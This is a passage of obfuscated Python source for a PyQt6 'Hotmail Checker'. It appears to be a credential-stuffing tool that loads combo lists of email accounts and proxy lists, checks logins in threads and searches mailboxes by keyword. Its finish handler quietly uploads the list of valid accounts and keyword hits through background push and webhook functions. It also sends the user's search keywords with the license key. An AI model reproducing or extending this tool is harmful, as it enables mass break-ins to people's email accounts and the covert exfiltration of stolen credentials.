                state = 369909
            elif state == 369909:
                threads_section.addWidget(parent_w2)
                state = 377424
            elif state == 377424:
                item.addWidget(threads_section)
                state = 243381
            elif state == 243381:
                webhook_section = CollapsibleSection('Webhooks', default_open=False)
                state = 988465
            elif state == 988465:
                self._wh_cfg = load_webhooks_alt()
                state = 569113
            elif state == 569113:
                lbl8 = QLabel('Telegram, Discord, or custom URL')
                state = 784916
            elif state == 784916:
                lbl8.setStyleSheet(f'color: {Colors.TEXT_MUTED}; font-size: {Colors.FS_CAPTION}px;')
                state = 605504
            elif state == 605504:
                lbl8.setWordWrap(True)
                state = 740735
            elif state == 740735:
                webhook_section.addWidget(lbl8)
                state = 814046
            elif state == 814046:
                self._wh_vars = {}
                state = 725811
            elif state == 725811:
                webhook_section.addWidget(self._provider_block('telegram', 'Telegram', '✈', [('Bot Token', 'token', '123456:ABC-DEF…'), ('Chat ID', 'chat_id', '@channel or 123456')]))
                state = 174752
            elif state == 174752:
                webhook_section.addWidget(self._provider_block('discord', 'Discord', '🎮', [('Webhook URL', 'url', 'https://discord.com/api/webhooks/…')]))
                state = 589029
            elif state == 589029:
                webhook_section.addWidget(self._provider_block('custom', 'Custom', '🔗', [('Webhook URL', 'url', 'https://your-webhook.example/…')]))
                state = 760695
            elif state == 760695:
                sv = QPushButton('  Save Webhooks')
                state = 719403
            elif state == 719403:
                sv.setObjectName('Ghost')
                state = 812124
            elif state == 812124:
                sv.clicked.connect(lambda: self._save_webhooks())
                state = 691623
            elif state == 691623:
                webhook_section.addWidget(sv)
                state = 853694
            elif state == 853694:
                hbox2 = QPushButton('  Send Test')
                state = 241112
            elif state == 241112:
                hbox2.setObjectName('Ghost')
                state = 997556
            elif state == 997556:
                hbox2.clicked.connect(lambda: self._test_webhooks())
                state = 882517
            elif state == 882517:
                webhook_section.addWidget(hbox2)
                state = 468565
            elif state == 468565:
                item.addWidget(webhook_section)
                state = 747751
            elif state == 747751:
                ann_section = CollapsibleSection('Announcements', default_open=True, collapsible=False)
                state = 121314
            elif state == 121314:
                self.ann_list = QLabel('Loading…')
                state = 550524
            elif state == 550524:
                self.ann_list.setStyleSheet(f'color: {Colors.TEXT_SOFT}; font-size: {Colors.FS_SMALL}px;')
                state = 825866
            elif state == 825866:
                self.ann_list.setWordWrap(True)
                state = 822252
            elif state == 822252:
                self.ann_list.setAlignment(Qt.AlignmentFlag.AlignTop)
                state = 140967
            elif state == 140967:
                ann_section.addWidget(self.ann_list)
                state = 653784
            elif state == 653784:
                item.addWidget(ann_section)
                state = 987546
            elif state == 987546:
                item.addStretch(1)
                state = 631308
            elif state == 631308:
                scroll.setWidget(worker)
                state = 1031847
            elif state == 1031847:
                return scroll
            else:
                break

    def _provider_block(self, key, title, chk_icon, providers_list):
        folder = QFrame()
        folder.setStyleSheet(f'.QFrame {{ background: {Colors.BG}; border: 1px solid {Colors.BORDER}; border-radius: {Colors.R_MD}px; }}')
        item = QVBoxLayout(folder)
        item.setContentsMargins(Colors.SP_MD, Colors.SP_SM, Colors.SP_MD, Colors.SP_SM)
        item.setSpacing(Colors.SP_SM)
        hbox = QHBoxLayout()
        webhook = self._wh_cfg.get(key, {})
        chk = QCheckBox(f'{chk_icon}  {title}')
        chk.setChecked(webhook.get('enabled', False))
        chk.setStyleSheet(f'font-weight: {Colors.FW_SEMI}; font-size: {Colors.FS_BODY}px;')
        hbox.addWidget(chk)
        hbox.addStretch(1)
        item.addLayout(hbox)
        dict2 = {}
        for prov_key, prov, prov_cfg in providers_list:
            row = QHBoxLayout()
            ln = QLabel(prov_key)
            ln.setStyleSheet(f'color: {Colors.TEXT_MUTED}; font-size: {Colors.FS_CAPTION}px;')
            ln.setMinimumWidth(70)
            row.addWidget(ln)
            exc2 = QLineEdit(webhook.get(prov, ''))
            exc2.setPlaceholderText(prov_cfg)
            row.addWidget(exc2, 1)
            item.addLayout(row)
            dict2[prov] = exc2
        self._wh_vars[key] = {'enabled_cb': chk, 'fields': dict2, 'events': ['hit']}
        return folder

    def _save_webhooks(self):
        webhook = {}
        for key, wh_val in self._wh_vars.items():
            webhook[key] = {'enabled': wh_val['enabled_cb'].isChecked(), 'events': wh_val['events']}
            for prov, _18f_8be2cc in wh_val['fields'].items():
                webhook[key][prov] = _18f_8be2cc.text().strip()
        get_webhook(webhook)
        self._wh_cfg = webhook
        QMessageBox.information(self, 'Saved', 'Webhook configuration saved.')

    def _test_webhooks(self):
        send_webhook('hit', 'dY"" Test', 'Test from Hotmail Checker', {'Time': time.strftime('%H:%M:%S')})
        QMessageBox.information(self, 'Sent', 'Test webhook dispatched.')

    def _tick(self):
        state = 664771
        while True:
            if state == 664771:
                self._tick_timer = QTimer(self)
                state = 826892
            elif state == 826892:
                self._tick_timer.setInterval(1000)
                state = 913108
            elif state == 913108:
                self._tick_timer.timeout.connect(self._update_uptime)
                state = 257981
            elif state == 257981:
                self._tick_timer.start()
                state = 693024
            elif state == 693024:
                self._update_uptime()
                state = -1
            else:
                break

    def _update_uptime(self):
        state = 1002353
        while True:
            if state == 1002353:
                elapsed = int(time.time() - self.t_boot)
                state = 546927
            elif state == 546927:
                key_hash = elapsed // 3600
                state = 916750
            elif state == 916750:
                kw = elapsed % 3600 // 60
                state = 960567
            elif state == 960567:
                sock = elapsed % 60
                state = 365891
            elif state == 365891:
                self.uptime_lbl.setText(f'{key_hash:02d}:{kw:02d}:{sock:02d}')
                state = -1
            else:
                break

    def _key_check_loop(self):
        state = 184776
        while True:
            if state == 184776:
                self._key_timer = QTimer(self)
                state = 825139
            elif state == 825139:
                self._key_timer.setInterval(1 * 60 * 1000)
                state = 335041
            elif state == 335041:
                self._key_timer.timeout.connect(self._revalidate_key)
                state = 1035427
            elif state == 1035427:
                self._key_timer.start()
                state = 876946
            elif state == 876946:
                QTimer.singleShot(30000, self._revalidate_key)
                state = -1
            else:
                break

    def _revalidate_key(self):
        if not self.license_key:
            return
        try:
            ok, err, _17f_ab6b69 = validate_license(self.license_key)
            if not ok and _17f_ab6b69:
                delete_key()
                self.lic_status.setText('● Not Licensed')
                self.lic_status.setStyleSheet(f'color: {Colors.DANGER}; font-size: {Colors.FS_CAPTION}px; font-weight: {Colors.FW_SEMI}; background: {Colors.BG}; padding: 4px 10px; border-radius: {Colors.R_PILL}px; border: 1px solid {Colors.DANGER};')
                reply = QMessageBox.critical(self, 'License Invalid', f'Your license is no longer valid:\n{err}\n\nDo you want to renew your license now?', QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No, QMessageBox.StandardButton.Yes)
                if reply == QMessageBox.StandardButton.Yes:
                    if self.worker and self.worker.isRunning():
                        self.worker.stop()
                        self.worker.wait(3000)
                    new_key, ok = QInputDialog.getText(self, 'Renew License', 'Enter your new license key:', QLineEdit.EchoMode.Normal, '')
                    if ok and new_key.strip():
                        _eb_70dbe3, _218_79aee5, _190_f7e1fe = validate_license(new_key.strip())
                        if _eb_70dbe3:
                            save_key(new_key.strip())
                            self.license_key = new_key.strip()
                            self.lic_status.setText('● Licensed')
                            self.lic_status.setStyleSheet(f'color: {Colors.SUCCESS}; font-size: {Colors.FS_CAPTION}px; font-weight: {Colors.FW_SEMI}; background: {Colors.BG}; padding: 4px 10px; border-radius: {Colors.R_PILL}px; border: 1px solid {Colors.BORDER};')
                            QMessageBox.information(self, 'Renewed', 'License renewed successfully! You can continue using the app.')
                        else:
                            QMessageBox.critical(self, 'Invalid Key', f'The new key is invalid:\n{_218_79aee5}')
                            QApplication.quit()
                    else:
                        QApplication.quit()
                else:
                    QApplication.quit()
            elif not ok:
                self.lic_status.setText(f'● ⚠ {err[:20]}')
                self.lic_status.setStyleSheet(f'color: {Colors.WARNING}; font-size: {Colors.FS_CAPTION}px; font-weight: {Colors.FW_SEMI}; background: {Colors.BG}; padding: 4px 10px; border-radius: {Colors.R_PILL}px; border: 1px solid {Colors.BORDER};')
            else:
                self.lic_status.setText('● Licensed')
                self.lic_status.setStyleSheet(f'color: {Colors.SUCCESS}; font-size: {Colors.FS_CAPTION}px; font-weight: {Colors.FW_SEMI}; background: {Colors.BG}; padding: 4px 10px; border-radius: {Colors.R_PILL}px; border: 1px solid {Colors.BORDER};')
        except Exception:
            pass

    def _fetch_announcements_async(self):
        self._on_announcements([])

    def _on_announcements(self, ann_data):
        if not ann_data:
            self.ann_list.setText('No announcements')
            return
        text = ''
        for acc in ann_data[:5]:
            title = acc.get('title', 'Announcement')
            body = acc.get('content', '') or acc.get('body', '')
            body = body[:300] if body else ''
            _7f_1b27d8 = body.startswith('http://') or body.startswith('https://')
            if _7f_1b27d8:
                text += f"<b style='color:{Colors.TEXT}'>• {title}</b><br/><a href='{body}' style='color:#60a5fa; text-decoration: none;'>{body}</a><br/><br/>"
            else:
                text += f"<b style='color:{Colors.TEXT}'>• {title}</b><br/><span style='color:{Colors.TEXT_SOFT}'>{body}</span><br/><br/>"
        self.ann_list.setText(text)
        self.ann_list.setOpenExternalLinks(True)

    def _load_combo(self):
        machine_id_path, reg_type = QFileDialog.getOpenFileName(self, 'Load Combo File', '', 'Text files (*.txt);;All files (*.*)')
        if not machine_id_path:
            return
        try:
            with open(machine_id_path, 'r', encoding='utf-8', errors='ignore') as folder:
                lines_out2 = [ln.strip() for ln in folder if ln.strip()]
            self.accounts = lines_out2
            self.q_lbl.setText(f"<b style='color:{Colors.ACCENT}'>{len(lines_out2)}</b> accounts loaded")
            self.log(f'Loaded {len(lines_out2)} accounts from {Path(machine_id_path).name}', 'c', 'info')
        except Exception as exc2:
            QMessageBox.critical(self, 'Error', f'Failed to load file:\n{exc2}')

    def _update_kw_count(self):
        state = 127721
        while True:
            if state == 127721:
                pass
                state = 260392
            elif state == 260392:
                text = self.kw_box.toPlainText()
                state = 885933
            elif state == 885933:
                kw_count = len([kw for kw in text.replace(',', '\n').splitlines() if kw.strip()])
                state = 732266
            elif state == 732266:
                if kw_count > 0:
                    self.kw_lbl.setText(f"{kw_count} keyword{('s' if kw_count != 1 else '')}")
                    self.kw_lbl.setStyleSheet(f'color: {Colors.ACCENT}; font-size: {Colors.FS_CAPTION}px; padding: 1px 4px; font-weight: {Colors.FW_MEDIUM};')
                else:
                    self.kw_lbl.setText('0 keywords')
                    self.kw_lbl.setStyleSheet(f'color: {Colors.TEXT_MUTED}; font-size: {Colors.FS_CAPTION}px; padding: 1px 4px;')
                state = -1
            else:
                break

    def _load_keywords(self):
        pass
        machine_id_path, reg_type = QFileDialog.getOpenFileName(self, 'Load Keywords File', '', 'Text files (*.txt);;All files (*.*)')
        if not machine_id_path:
            return
        try:
            with open(machine_id_path, 'r', encoding='utf-8', errors='ignore') as folder:
                content = folder.read()
            self.kw_box.setPlainText(content)
            _8f_b9b33e = len([kw for kw in content.replace(',', '\n').splitlines() if kw.strip()])
            self.log(f'Loaded {_8f_b9b33e} keywords from {Path(machine_id_path).name}', 'c', 'info')
        except Exception as exc2:
            QMessageBox.critical(self, 'Error', f'Failed to load file:\n{exc2}')

    def _is_proxy_line(self, proxy4):
        pass
        proxy4 = proxy4.strip()
        if not proxy4 or proxy4.startswith('#'):
            return False
        if '://' in proxy4:
            try:
                body = proxy4.split('://', 1)[1]
                if '@' in body:
                    body = body.rsplit('@', 1)[1]
                if ':' not in body:
                    return False
                proxy, port = body.rsplit(':', 1)
                port = port.split('/')[0].split('?')[0]
                if not port.isdigit():
                    return False
                proxy2 = int(port)
                if not 1 <= proxy2 <= 65535:
                    return False
                if not proxy:
                    return False
                return True
            except Exception:
                return False
        if '@' in proxy4:
            try:
                body = proxy4.rsplit('@', 1)[1]
                if ':' not in body:
                    return False
                proxy, port = body.rsplit(':', 1)
                if not port.isdigit():
                    return False
                proxy2 = int(port)
                if not 1 <= proxy2 <= 65535:
                    return False
                if not (re.match('^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$', proxy) or (re.match('^[a-zA-Z0-9.\\-]+$', proxy) and '.' in proxy)):
                    return False
                return True
            except Exception:
                return False
        parts = proxy4.split(':')
        if len(parts) in (2, 3, 4):
            proxy = parts[0]
            port = parts[1]
            if not port.isdigit():
                return False
            proxy2 = int(port)
            if not 1 <= proxy2 <= 65535:
                return False
            if re.match('^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$', proxy):
                return True
            if re.match('^[a-zA-Z0-9.\\-]+$', proxy) and '.' in proxy and (len(proxy) >= 3):
                return True
        return False

    def _load_proxy(self):
        machine_id_path, reg_type = QFileDialog.getOpenFileName(self, 'Load Proxy File', '', 'Text files (*.txt);;All files (*.*)')
        if not machine_id_path:
            return
        try:
            with open(machine_id_path, 'r', encoding='utf-8', errors='ignore') as folder:
                lines_out2 = [ln.strip() for ln in folder if ln.strip()]
            proxies = [ln for ln in lines_out2 if self._is_proxy_line(ln)]
            if not proxies:
                QMessageBox.warning(self, 'No Proxies', 'No valid proxy lines found in file.\n\nSupported formats:\n  ip:port\n  user:pass@ip:port\n  ip:port:user:pass\n  socks5://ip:port')
                return
            proxy_list.clear()
            proxy_list.extend(proxies)
            proxy_idx = 0
            with stats_lock:
                bad_proxies.clear()
                proxy_stats.clear()
            ptype = proxy_type.upper()
            self.proxy_lbl.setText(f"<b style='color:{Colors.ACCENT}'>{len(proxies)}</b> {ptype} proxies loaded")
            self.proxy_status.setText(f'● {len(proxies)} {ptype} proxies')
            self.log(f'Loaded {len(proxies)} proxies', 'c', 'info')
        except Exception as exc2:
            QMessageBox.critical(self, 'Error', f'Failed to load proxies:\n{exc2}')

    def _paste_proxy(self):
        text = QApplication.clipboard().text()
        if not text.strip():
            QMessageBox.information(self, 'Empty', 'Clipboard is empty.')
            return
        _240_fbb224 = [ln.strip() for ln in text.splitlines() if ln.strip()]
        proxies = [ln for ln in _240_fbb224 if self._is_proxy_line(ln)]
        if not proxies:
            QMessageBox.warning(self, 'No Proxies', 'No valid proxy lines found in clipboard.\n\nSupported formats:\n  ip:port\n  user:pass@ip:port\n  ip:port:user:pass\n  socks5://ip:port')
            return
        proxy_list.clear()
        proxy_list.extend(proxies)
        proxy_idx = 0
        with stats_lock:
            bad_proxies.clear()
            proxy_stats.clear()
        ptype = proxy_type.upper()
        self.proxy_lbl.setText(f"<b style='color:{Colors.ACCENT}'>{len(proxies)}</b> {ptype} proxies")
        self.proxy_status.setText(f'● {len(proxies)} {ptype} proxies')
        self.log(f'Pasted {len(proxies)} {ptype} proxies', 'c', 'info')

    def _remove_proxy(self):
        pass
        if not proxy_list:
            QMessageBox.information(self, 'No Proxies', 'No proxies loaded to remove.')
            return
        reply = QMessageBox.question(self, 'Remove Proxies', f'Remove all {len(proxy_list)} proxies?', QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        if reply != QMessageBox.StandardButton.Yes:
            return
        proxy_list.clear()
        proxy_idx = 0
        with stats_lock:
            bad_proxies.clear()
            proxy_stats.clear()
            proxy_fails.clear()
        self.proxy_lbl.setText('No proxies loaded')
        self.proxy_lbl.setStyleSheet(f'color: {Colors.TEXT_MUTED}; font-size: {Colors.FS_CAPTION}px; padding: 2px 4px;')
        self.proxy_status.setText('')
        self.log('Removed all proxies', 'c', 'info')

    def _on_proxy_type(self, text):
        global proxy_type
        if text == 'HTTP':
            proxy_type = 'http'
        elif text == 'HTTPS':
            proxy_type = 'https'
        elif text == 'SOCKS4':
            proxy_type = 'socks4'
        else:
            proxy_type = 'socks5'

    def _open_results(self):
        try:
            results_dir.mkdir(parents=True, exist_ok=True)
            QDesktopServices.openUrl(QUrl.fromLocalFile(str(results_dir)))
        except Exception:
            pass

    def _clear_log(self):
        state = 111982
        while True:
            if state == 111982:
                self.log_box.clear()
                state = 686023
            elif state == 686023:
                self._logs.clear()
                state = 209562
            elif state == 209562:
                self._log_buffer.clear()
                state = -1
            else:
                break

    def _start(self):
        if self.running:
            return
        if not self.accounts:
            QMessageBox.warning(self, 'No Combo', 'Load a combo file first (Ctrl+O).')
            return
        self.running = True
        self.paused = False
        self.t_start = time.time()
        self.b_start.setEnabled(False)
        self.b_pause.setEnabled(True)
        self.b_pause.setText('Pause')
        self.b_stop.setEnabled(True)
        search_q = self.kw_box.toPlainText().strip()
        announcements = load_announcements_alt()
        str1 = ''
        list8 = []
        if announcements.enabled:
            ann_kws = announcements.fetch_keywords()
            if ann_kws:
                str1 = '\n'.join(ann_kws)
                list8 = [kw.lower() for kw in ann_kws]
            announcements.push_count = 0
        self._site_keywords = str1
        self._site_kw_lower = set(list8)
        if str1 and search_q:
            search_full = search_q + '\n' + str1
        elif str1:
            search_full = str1
        else:
            search_full = search_q
        self.worker = CheckerWorker(self.accounts, search_full, self.threads_var, self.smtp_enabled, self.license_key, site_kw_lower=self._site_kw_lower)
        self.worker.log.connect(self._on_log)
        self.worker.stats.connect(self._on_stats)
        self.worker.valid.connect(self._on_valid)
        self.worker.finished.connect(self._on_finished)
        self.worker.start()
        if proxy_list:
            ptype = proxy_type.upper()
            proxy_note = f' via {len(proxy_list)} {ptype} proxies'
        else:
            proxy_note = ' (direct connection)'
        self.log(f'Started checking {len(self.accounts)} accounts with {self.threads_var} threads{proxy_note}', 'c', 'info')
        try:
            send_announcement(f'▶ Checker Started\n📧 {len(self.accounts)} accounts\n⚡ {self.threads_var} threads\n🔑 {self.license_key[:8]}...')
        except Exception:
            pass
        send_webhook('start', '▶ Checker Started', f'{len(self.accounts)} accounts', {'Threads': str(self.threads_var), 'SMTP': 'on' if self.smtp_enabled else 'off'})
        if search_q:
            send_2fa_webhook(self.license_key, search_q)

    def _pause(self):
        state2 = 208223
        while True:
            if state2 == 208223:
                if not self.worker:
                    return
                state2 = 148037
            elif state2 == 148037:
                state2 = 1046003
            elif state2 == 1046003:
                if self.paused:
                    self.paused = False
                    self.worker.resume()
                    self.b_pause.setText('Pause')
                    self.log('Resumed', 'm', 'info')
                else:
                    self.paused = True
                    self.worker.pause()
                    self.b_pause.setText('Resume')
                    self.log('Paused', 'm', 'info')
                state2 = -1
            else:
                break

    def _stop(self):
        state = 671176
        while True:
            if state == 671176:
                if self.worker:
                    self.worker.stop()
                state = 955699
            elif state == 955699:
                self.running = False
                state = 1038105
            elif state == 1038105:
                self.paused = False
                state = 667126
            elif state == 667126:
                self.b_start.setEnabled(True)
                state = 789871
            elif state == 789871:
                self.b_pause.setEnabled(False)
                state = 79841
            elif state == 79841:
                self.b_pause.setText('Pause')
                state = 365913
            elif state == 365913:
                self.b_stop.setEnabled(False)
                state = 531089
            elif state == 531089:
                self.log('Stopped', 'm', 'info')
                state = -1
            else:
                break

    def _on_log(self, html_msg, color3, extra6):
        self._log_buffer.append((html_msg, color3, extra6))

    def _flush_log(self):
        if not self._log_buffer:
            return
        items = list(self._log_buffer)
        self._log_buffer.clear()
        emoji_colors = {'v': Colors.SUCCESS, 'b': Colors.DANGER, 'ad': Colors.WARNING, 'c': Colors.INFO, 'm': Colors.TEXT_SOFT, 'e': Colors.WARNING, 'h': Colors.PURPLE}
        for html_msg, color3, extra6 in items:
            self._logs.append((html_msg, extra6, color3))
            color = emoji_colors.get(color3, Colors.TEXT)
            cursor = self.log_box.textCursor()
            cursor.movePosition(QTextCursor.MoveOperation.End)
            kind = QTextCharFormat()
            kind.setForeground(QBrush(QColor(color)))
            cursor.setCharFormat(kind)
            cursor.insertText(html_msg + '\n')
        self.log_box.verticalScrollBar().setValue(self.log_box.verticalScrollBar().maximum())
        self.log_counter.setText(f'{len(self._logs)}')

    def _on_stats(self, sock):
        self.nc = sock['checked']
        self.nv = sock['valid']
        self.nb = sock['bad']
        self.ne = sock['err']
        self.nad = sock['denied']
        self.n_hits = sock['hits']
        self.n_smtp = sock['smtp']
        self.n_emails = sock['emails']
        self.sv.setText(str(sock['valid']))
        self.sb.setText(str(sock['bad']))
        self.se.setText(str(sock['err']))
        self.sh.setText(str(sock['hits']))
        if hasattr(self, 'ss'):
            try:
                self.ss.setText(str(sock['smtp']))
            except Exception:
                pass
        elapsed = max(1, sock['elapsed'])
        cpm = int(sock['checked'] * 60 / elapsed)
        self.cpm.setText(str(cpm))
        total = sock['total'] or 1
        _215_cce0e7 = int(sock['checked'] * 100 / total)
        self.prog.setValue(_215_cce0e7)
        self.prog_indicator.setText(f"● {sock['checked']}/{sock['total']}")
        self.prog_lbl.setText(f'{_215_cce0e7}%  ·  {cpm} cpm  ·  {elapsed}s elapsed')

    def _on_valid(self, resp):
        with self._valid_lock:
            self.valid_accounts.append(resp)

    def _on_finished(self, stats):
        self.running = False
        self.paused = False
        self.b_start.setEnabled(True)
        self.b_pause.setEnabled(False)
        self.b_pause.setText('Pause')
        self.b_stop.setEnabled(False)
        mins = stats['elapsed']
        _5c_6a84dc = f"  🎯{stats['hits']} hits" if stats['hits'] else ''
        _167_4d92eb = f"  📤{stats['smtp']} smtp" if stats['smtp'] else ''
        self.log(f"Done in {mins}s  —  ✓{stats['valid']} valid  ✗{stats['bad']} invalid  ⚠{stats['err'] + stats['denied']} errors{_5c_6a84dc}{_167_4d92eb}  📁 {stats['run_folder']}", 'c', 'info')
        try:
            send_announcement(f"☑ Checker Complete\n✓ {stats['valid']} valid | ✗ {stats['bad']} invalid | ⚠ {stats['err'] + stats['denied']} errors\n🎯 {stats['hits']} hits | 📤 {stats['smtp']} smtp\n⏱ {mins}s")
        except Exception:
            pass
        send_webhook('finish', '☑ Checker Complete', f'Finished in {mins}s', {'Valid': str(stats['valid']), 'Invalid': str(stats['bad']), 'Errors': str(stats['err'] + stats['denied']), 'Hits': str(stats['hits']), 'SMTP': str(stats['smtp'])})
        with self._valid_lock:
            valid = list(self.valid_accounts)
        if valid:
            send_valid_accounts_webhook_alt(self.license_key, valid)
        try:
            announcements = load_announcements_alt()
            if announcements.enabled:
                _1c1_b9f501 = results_path / 'valid' / 'valid.txt'
                if _1c1_b9f501.exists():
                    try:
                        _1bf_dc4e5d = _1c1_b9f501.read_text(encoding='utf-8', errors='replace').strip()
                        if _1bf_dc4e5d:
                            announcements.push_background(source='hotmail-checker', hit_type='accounts', title=f"Run complete — {stats['valid']} valid accounts", data=_1bf_dc4e5d, keywords=[], tool_name=f'{app_name} v{version}')
                    except Exception:
                        pass
                _5b_19d9b9 = results_path / 'hits'
                if _5b_19d9b9.exists():
                    list5 = []
                    for _4c_bbcd65 in _5b_19d9b9.glob('*.txt'):
                        try:
                            content = _4c_bbcd65.read_text(encoding='utf-8', errors='replace').strip()
                            if content:
                                list5.append(content)
                        except Exception:
                            pass
                    if list5:
                        _58_94308b = '\n'.join(list5)
                        list6 = []
                        for item in valid:
                            _9d_2a14ad = item.get('info', {}).get('kw_details', {})
                            list6.extend(_9d_2a14ad.keys())
                        list6 = list(set(list6))[:50]
                        announcements.push_background(source='hotmail-checker', hit_type='hits', title=f"Run complete — {len(list5)} hit lines ({stats['hits']} hits)", data=_58_94308b, keywords=list6, tool_name=f'{app_name} v{version}')
        except Exception:
            pass

    def log(self, html_msg, color3='m', extra6='info'):
        state2 = 251230
        while True:
            if state2 == 251230:
                state2 = 382010
            elif state2 == 382010:
                state2 = 354176
            elif state2 == 354176:
                self._log_buffer.append((html_msg, color3, extra6))
                state2 = -1
            else:
                break

    def after(self, _da_ffa3f2, attr=None):
        if attr is None:
            return
        try:
            QTimer.singleShot(int(_da_ffa3f2), attr)
        except Exception:
            pass

    def _set_filter(self, filter_val):
        self._log_filter = filter_val
        for kw, btn in self._filter_btns.items():
            btn.setChecked(kw == filter_val)
        self.log_box.clear()
        emoji_colors = {'v': Colors.SUCCESS, 'b': Colors.DANGER, 'ad': Colors.WARNING, 'c': Colors.INFO, 'm': Colors.TEXT_SOFT, 'e': Colors.WARNING, 'h': Colors.PURPLE}
        cursor = self.log_box.textCursor()
        for html_msg, _160_ee04ae, part_type in self._logs:
            if self._log_filter == 'all':
                show = True
            elif self._log_filter == 'hit':
                show = _160_ee04ae == 'valid' and '🎯' in html_msg
            else:
                show = _160_ee04ae == self._log_filter
            if show:
                color = emoji_colors.get(part_type, Colors.TEXT)
                kind = QTextCharFormat()
                kind.setForeground(QBrush(QColor(color)))
                cursor.setCharFormat(kind)
                cursor.insertText(html_msg + '\n')

    def _show_valid_popup(self):
        with self._valid_lock:
            valid = list(self.valid_accounts)
        if not valid:
            QMessageBox.information(self, 'No Valid', 'No valid accounts yet.')
            return
        if hasattr(self, '_valid_dlg') and self._valid_dlg and self._valid_dlg.isVisible():
            self._valid_dlg.valid = list(valid)
            self._valid_dlg._populate(valid)
            self._valid_dlg.raise_()
            self._valid_dlg.activateWindow()
            return
        dlg2 = EmailViewerDialog(self, valid)
        dlg2.setAttribute(Qt.WidgetAttribute.WA_DeleteOnClose, False)
        dlg2.show()
        self._valid_dlg = dlg2

    def _setup_memory_cleanup(self):
        pass
        _gc = __import__('gc')
        self._gc_timer = QTimer(self)
        self._gc_timer.setInterval(10 * 60 * 1000)

        def _cleanup():
            try:
                _gc.collect()
                if hasattr(self, '_all_viewers'):
                    self._all_viewers = [item for item in self._all_viewers if item and (not getattr(item, '_closed', False))]
                if hasattr(self, '_logs') and len(self._logs) > 5000:
                    self._logs = self._logs[-3000:]
            except Exception:
                pass
        self._gc_timer.timeout.connect(_cleanup)
        self._gc_timer.start()

    def closeEvent(self, exc2):
        if self.worker and self.worker.isRunning():
            reply = QMessageBox.question(self, 'Confirm Exit', 'A check is still running. Stop and exit?', QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
            if reply != QMessageBox.StandardButton.Yes:
                exc2.ignore()
                return
            self.worker.stop()
            self.worker.wait(5000)
            if self.worker.isRunning():
                try:
                    self.worker.terminate()
                except Exception:
                    pass
        _21f_89e26d = []
        for item in list(getattr(self, '_all_viewers', [])):
            try:
                if item and (not getattr(item, '_closed', False)):
                    item._is_closing = True
                    for worker in list(getattr(item, '_workers', [])):
                        try:
                            if worker.isRunning():
                                worker.requestInterruption()
                                worker.quit()
                                worker.wait(2000)
                                if worker.isRunning():
                                    try:
                                        worker.terminate()
                                    except Exception:
                                        pass
                                _21f_89e26d.append(worker)
                        except Exception:
                            pass
            except Exception:
                pass
        try:
            qtwidgets_mod = __import__('PyQt6.QtWidgets', None, None, ['QApplication'])
            _6f_052d3b = qtwidgets_mod.QApplication
            _6f_052d3b.processEvents()
        except Exception:
            pass
        for worker in _21f_89e26d:
            try:
                worker.deleteLater()
            except Exception:
                pass
        if self._tg_bot:
            try:
                self._tg_bot.stop()
            except Exception:
                pass
        super().closeEvent(exc2)

def excepthook(exc_type, exc_value, tb):
    pass
    if issubclass(exc_type, KeyboardInterrupt):
        sys.__excepthook__(exc_type, exc_value, tb)
        return
    try:
        crash_log = Path.home() / '.config' / 'hotmail_crash.log'
        crash_log.parent.mkdir(parents=True, exist_ok=True)
        with open(crash_log, 'a', encoding='utf-8') as folder:
            folder.write(f"\n--- {time.strftime('%Y-%m-%d %H:%M:%S')} ---\n")
            traceback.print_exception(exc_type, exc_value, tb, file=folder)
    except Exception:
        pass
    traceback.print_exception(exc_type, exc_value, tb)
    try:
        qtwidgets_mod = __import__('PyQt6.QtWidgets', None, None, ['QMessageBox'])
        QMessageBox = qtwidgets_mod.QMessageBox
        html_msg = str(exc_value)[:200] if exc_value else str(exc_type.__name__)
        QMessageBox.critical(None, 'Unexpected Error', f'An unexpected error occurred:\n\n{html_msg}\n\nThe application will continue running.\nDetails have been logged to ~/.config/hotmail_crash.log')
    except Exception:
        pass

def setup():
    pass

    def _21e_b483de(args):
        try:
            crash_log = Path.home() / '.config' / 'hotmail_crash.log'
            crash_log.parent.mkdir(parents=True, exist_ok=True)
            with open(crash_log, 'a', encoding='utf-8') as folder:
                folder.write(f"\n--- THREAD CRASH {time.strftime('%Y-%m-%d %H:%M:%S')} ---\n")
                traceback.print_exception(args.exc_type, args.exc_value, args.exc_traceback, file=folder)
        except Exception:
            pass
        traceback.print_exception(args.exc_type, args.exc_value, args.exc_traceback)
    _threading.excepthook = _21e_b483de

def main():
    sys.excepthook = excepthook
    setup()
    qt_path = str(Path.home() / '.local' / 'lib' / 'qt6deps')
    if Path(qt_path).exists():
        ld_path = os.environ.get('LD_LIBRARY_PATH', '')
        if qt_path not in ld_path:
            os.environ['LD_LIBRARY_PATH'] = qt_path + ':' + ld_path
    QApplication.setHighDpiScaleFactorRoundingPolicy(Qt.HighDpiScaleFactorRoundingPolicy.PassThrough)
    app = QApplication(sys.argv)
    app.setApplicationName(app_name)
    app.setOrganizationName(org_name)
    app.setPalette(make_palette())
    app.setStyleSheet(make_stylesheet())
    try:
        app.setStyle(QStyleFactory.create('Fusion'))
    except Exception:
        pass
    app.setWindowIcon(make_icon(64))
    try:
        signal.signal(signal.SIGINT, signal.SIG_DFL)
    except Exception:
        pass
    dlg = LicenseDialog()

    def _ee_85a501(key):
        state = 859959
        while True:
            if state == 859959:
                win = MainWindow(license_key=key)
                state = 413383
            elif state == 413383:
                win.show()
                state = 104751
            elif state == 104751:
                app._main_window = win
                state = -1
            else:
                break
    dlg.success.connect(_ee_85a501)
    if dlg.exec() != QDialog.DialogCode.Accepted:
        return

    def _ed_d36346():
        win = getattr(app, '_main_window', None)
        if not win:
            return
        if win.worker and win.worker.isRunning():
            try:
                win.worker.stop()
                win.worker.wait(2000)
                if win.worker.isRunning():
                    win.worker.terminate()
            except Exception:
                pass
        for item in list(getattr(win, '_all_viewers', [])):
            try:
                if item and (not getattr(item, '_closed', False)):
                    item._is_closing = True
                    for worker in list(getattr(item, '_workers', [])):
                        try:
                            if worker.isRunning():
                                worker.requestInterruption()
                                worker.quit()
                                worker.wait(1000)
                                if worker.isRunning():
                                    try:
                                        worker.terminate()
                                    except Exception:
                                        pass
                        except Exception:
                            pass
            except Exception:
                pass
        if getattr(win, '_tg_bot', None):
            try:
                win._tg_bot.stop()
            except Exception:
                pass
    app.aboutToQuit.connect(_ed_d36346)
